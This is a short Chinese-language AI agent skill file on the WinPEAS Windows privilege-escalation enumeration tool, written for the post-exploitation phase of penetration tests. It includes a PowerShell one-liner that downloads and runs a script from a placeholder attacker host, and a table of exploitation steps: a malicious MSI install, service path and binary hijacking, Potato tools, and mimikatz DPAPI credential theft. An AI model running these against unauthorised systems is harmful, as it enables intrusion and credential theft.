---
name: winpeas
description: >
  此技能适用于用户询问关于 "winpeas"、"以低权限用户在 Windows 上发现提权路径"。自动化 Windows 提权枚举工具，可检测服务配置错误、未加引号的服务路径、AlwaysInstallElevated、可写注册表键、Token 权限及存储的凭据。适合后渗透阶段以低权限用户身份发现提权向量。
---

# WinPEAS

Windows 提权 (Privilege Escalation) 枚举工具。

## 快速开始

```
winPEASx64.exe
winPEASx64.exe quiet servicesinfo
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/winPEAS.ps1")
```

## 检查类别

| 参数 | 检测内容 |
|----------|--------------|
| `systeminfo` | 操作系统版本/补丁级别及 CVE 指示 |
| `userinfo` | Token 权限、组成员关系 |
| `servicesinfo` | 未加引号的路径、可写的服务二进制文件 |
| `applicationsinfo` | 已安装软件版本 |
| `networkinfo` | 网络接口、共享、防火墙规则 |
| `windowscreds` | DPAPI、Vault、自动登录、注册表凭据 |
| `filesinfo` | 可写目录、敏感文件 |

## 高价值发现

| 发现 | 利用方式 |
|---------|---------|
| `AlwaysInstallElevated = 1` | `msiexec /quiet /i evil.msi` |
| 未加引号的服务路径 | 在路径中间目录放置同名可执行文件 |
| 可写的服务二进制文件 | 替换二进制文件后重启服务 |
| SeImpersonatePrivilege | PrintSpoofer / GodPotato |
| 存储的 DPAPI 凭据 | `mimikatz dpapi::` 或 SharpDPAPI |

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | Potato 系列攻击及各向量利用方法 |
